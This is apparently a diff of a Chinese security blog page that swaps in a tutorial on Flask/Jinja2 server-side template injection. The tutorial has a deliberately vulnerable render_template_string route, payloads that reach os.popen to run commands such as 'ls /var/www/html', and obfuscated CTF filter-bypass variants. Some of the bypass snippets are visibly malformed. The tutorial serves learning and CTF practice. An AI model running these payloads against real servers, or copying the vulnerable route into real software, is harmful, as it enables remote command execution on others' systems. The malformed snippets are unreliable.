@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/09/08/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%9B%9B/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/09/11/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/08/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%9B%9B/" class="post-title-link" itemprop="url">Java学习记录(四)</a>
+          <a href="/2022/09/11/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">flask之ssti模板注入知识点及复现</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-09-08 21:05:15" itemprop="dateCreated datePublished" datetime="2022-09-08T21:05:15+08:00">2022-09-08</time>
+      <time title="创建时间：2022-09-11 17:08:25" itemprop="dateCreated datePublished" datetime="2022-09-11T17:08:25+08:00">2022-09-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">编程语言学习</span></a>
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
         </span>
     </span>
 
   
-    <span id="/2022/09/08/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%9B%9B/" class="post-meta-item leancloud_visitors" data-flag-title="Java学习记录(四)" title="阅读次数">
+    <span id="/2022/09/11/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/" class="post-meta-item leancloud_visitors" data-flag-title="flask之ssti模板注入知识点及复现" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>705</span>
+      <span>4.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>4 分钟</span>
     </span>
 </div>
 
@@ -283,68 +283,105 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
-<li>修饰符</li>
-</ul>
-<h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>（1） <strong>包的概述和使用</strong></p>
+          <p>原创文章：</p>
 <ul>
-<li>其实就是文件夹</li>
-<li>作用：对类进行分类管理</li>
-<li>包的定义格式：<ul>
-<li>格式：<code>package包名</code>（多级包用.分开）</li>
-<li>例子：package com.test;</li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">先知社区——小猪佩奇</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260504.html">FreeBuf——DeceaseWolf</a></li>
 </ul>
-</li>
-</ul>
-<p>带包的Java类编译和执行</p>
+<h3 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h3><p>首先还是感谢两位师傅的文章，受益匪浅！本文主要是转载和自我学习。</p>
+<h3 id="SSTI模板注入的成因"><a href="#SSTI模板注入的成因" class="headerlink" title="SSTI模板注入的成因"></a>SSTI模板注入的成因</h3><p>SSTI服务端模板注入，SSTI主要为python的一些框架 jinja2、mako、tornado、django，PHP框架smarty、twig，以及Java的框架jade、velocity使用了渲染函数时，由于代码的不规范或者是开发者过分信赖用户输入而导致了服务端模板注入。</p>
+<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><ul>
+<li><p>什么是模板引擎？我们为什么要使用模板？</p>
 <ul>
-<li>手动建包：<ul>
-<li>按照以前的格式编译java文件 javac HelloWorld.java</li>
-<li>手动创建包 在E盘建立文件夹com，然后在com下建立文件夹test</li>
-<li>把class文件放在包的里面 把HelloWorld.class文件放在com的test文件夹下</li>
-<li>带包执行 java com.test.HelloWorld</li>
+<li>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，可以大大提升开发效率，良好的设计也使得代码重用变得更加容易。</li>
 </ul>
 </li>
-<li>自动建包：javac -d HelloWorld.java java com.test.HelloWorld</li>
+<li><p>拿到数据之后，然后塞到模板中，再让渲染引擎将塞进去的东西生成html的文本发送给浏览器，这样可以提高效率。</p>
+</li>
 </ul>
-<p>（2） <strong>导包</strong></p>
+<h3 id="本地flask环境搭建"><a href="#本地flask环境搭建" class="headerlink" title="本地flask环境搭建"></a>本地flask环境搭建</h3><p>环境：3.10<br>工具：pycharm专业版</p>
 <ul>
-<li>导包的概述和使用：为了简化带包的操作，Java就提供了导包的功能</li>
-<li>导包的格式：<ul>
-<li>格式：import 包名;</li>
-<li>例子：import cn.test.Teacher;</li>
+<li>首先新建项目</li>
 </ul>
-</li>
-</ul>
-<p>（3） <strong>修饰符</strong></p>
-<p>修饰符分类：</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-103-1024x542.png" alt="img"></p>
 <ul>
-<li>权限修饰符</li>
+<li>选择flask项目，点击创建</li>
 </ul>
-<p>修饰符| 同一个类中| 同一个包中  </p>
-<p>子类无关类| 不同包的子类| 不同包的无关类<br>—|—|—|—|—<br>private| √| | |<br>默认| √| √| |<br>protected| √| √| √|<br>public| √| √| √| √  </p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-105-1024x539.png" alt="img"></p>
 <ul>
-<li><p>状态修饰符</p>
+<li>出现这样的界面</li>
+</ul>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-106-1024x542.png" alt="img"></p>
 <ul>
-<li>final（最终态）：final关键字是最终的意思，可以修饰成员方法、成员变量、类<ul>
-<li>final修饰的特点：<ul>
-<li>修饰方法：表明该方法是最终方法，不能被重写</li>
-<li>修饰变量：表明该变量是常量，不能再次被赋值</li>
-<li>修饰类：表明该类是最终类，不能被继承</li>
+<li>右键进行调试，如果出现报错的话，是因为你没有安装flask模块，使用<code>pip install flask</code>进行安装重新运行即可</li>
 </ul>
-</li>
-<li>final修饰局部变量<ul>
-<li>变量是基本类型：final修饰指的是基本类型的数据值不能发生改变</li>
-<li>变量是引用类型：final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</li>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-107-1024x541.png" alt="img"></p>
+<ul>
+<li>访问指定链接，看到如下页面说明成功了</li>
 </ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>static（静态）：</p>
-</li>
-</ul>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-108-1024x97.png" alt="img"></p>
+<h3 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>使用route()装饰器告诉Flask是什么样的URL才能触发我们的函数.route()装饰器把一个函数绑定到对应的URL上，这就相当于路由，一个路由会跟着一个函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-111-1024x544.png" alt="img"></p>
+<p>然后我们进行访问</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-112-1024x97.png" alt="img"></p>
+<p>我们在这里修改一下规则，使用下面的这段代码来设置动态网址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello/&lt;username&gt;&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_user</span>(<span class="params">username</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user:%s&quot;</span> % username</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-114-1024x106.png" alt="img"></p>
+<blockquote>
+<p>int 接受整数<br>float 接收浮点数<br>path 和默认的相似，但也接收斜线</p>
+</blockquote>
+<h3 id="main入口"><a href="#main入口" class="headerlink" title="main入口"></a>main入口</h3><p>当python文件运行的时候，在<code>if __name__ == &#39;__main__&#39;</code>下面的代码将会运行，当python文件被导入的时候，在<code>if __name__ == &#39;__main__&#39;</code>下面的代码将不会运行。</p>
+<blockquote>
+<p>测试的时候，我们可以使用debug，方便调试，增加一句：app.debug &#x3D; True</p>
+<p>这个可以让操作系统监听所有的公网IP，就可以在公网上面看到自己的web了：app.run(host&#x3D;’0.0.0.0’)</p>
+</blockquote>
+<h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>我们可以使用<code>render_template()</code>方法来渲染模板。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模板渲染实例</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>) </span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure>
+
+<p>html文件是放在<code>templates</code>文件夹当中的，然后我们放一个<code>index.html</code>到该文件夹当中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里只放了一个参数进行渲染，然后我们在app.py文件中进行渲染</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>) </span></span><br><span class="line"><span class="comment"># 我们访问/或者/index都会跳转 </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;小菜猴子&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># 传入一个字典数组 </span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-115-1024x149.png" alt="img"></p>
+<h3 id="flask-SSTI模板注入复现"><a href="#flask-SSTI模板注入复现" class="headerlink" title="flask SSTI模板注入复现"></a>flask SSTI模板注入复现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(): </span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27; &lt;h3&gt;%s&lt;/h3&gt; &#x27;&#x27;&#x27;</span> % code</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>&#123;&#123;7*7&#125;&#125;</code>发现回显的是49，说明存在SSTI模板注入</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-116-1024x104.png" alt="img"></p>
+<p>然后我们使用<code>&#123;&#123;''.__class__&#125;&#125;</code>获取字符串的类对象</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-117-1024x94.png" alt="img"></p>
+<p>使用<code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>寻找基类</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-119-1024x108.png" alt="img"></p>
+<p>使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code>寻找可用的引用</p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-120-1024x546.png" alt="img"></p>
+<p>然后我们使用下标的方式获取<code>os._wrap_close</code>，使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138]&#125;&#125;</code></p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-121-1024x129.png" alt="img"></p>
+<p>然后我们利用<code>__init__.__globals__</code>来找os类下的所有方法及变量和参数。使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__&#125;&#125;</code></p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-122-1024x540.png" alt="img"></p>
+<p>我们发现这里有一个popen函数，然后我们使用他，poc为<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['popen']('dir').read()&#125;&#125;</code></p>
+<p><img src="/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-123-1024x123.png" alt="img"></p>
+<h3 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h3><blockquote>
+<p>__base__ 以元组返回一个类直接所继承的类<br>__mro__ 以元组返回继承关系链<br>__class__ 返回对象所属的类<br>__globals__ 以dict返回函数所在模块命名空间中的所有变量<br>__subclasses__() 以列表返回类的子类<br>__init__ 类的初始化方法<br><em>builtin</em> 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)</p>
+<p>ps：在py3中__builtin__被换成了builtin __builtin__ 和 __builtins__之间是什么关系呢？<br>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。<br>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</p>
+</blockquote>
+<h4 id="CTF中的一些绕过技巧"><a href="#CTF中的一些绕过技巧" class="headerlink" title="CTF中的一些绕过技巧"></a>CTF中的一些绕过技巧</h4><p>1、过滤[]等符号：使用gititem绕过。<br>如原poc <code>&#123;&#123;"".__class__.__bases__[0]&#125;&#125;</code>，绕过后<code>&#123;&#123;"".__class__.bases__.__getitem__(0)&#125;&#125;</code></p>
+<p>2、过滤了subclasses，使用拼凑法绕过<br>如原poc：</p>
+<p> <code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;</code>，绕过后<code>&#123;&#123;"".__class__.bases[0]__'subcla'+'sses'&#125;&#125;</code></p>
+<p>3、过滤了class，使用session</p>
+<p><code> &#123;&#123;session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</code><br>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[12]&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4、poc</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再次感谢两位师傅的文章！</p>
+<p>如果文章有何不妥之处，请您指出。</p>
 
       
     </div>
@@ -364,7 +401,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/35/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/35/">35</a><span class="page-number current">36</span><a class="page-number" href="/page/37/">37</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/37/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/35/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/35/">35</a><span class="page-number current">36</span><a class="page-number" href="/page/37/">37</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/37/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -388,7 +425,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
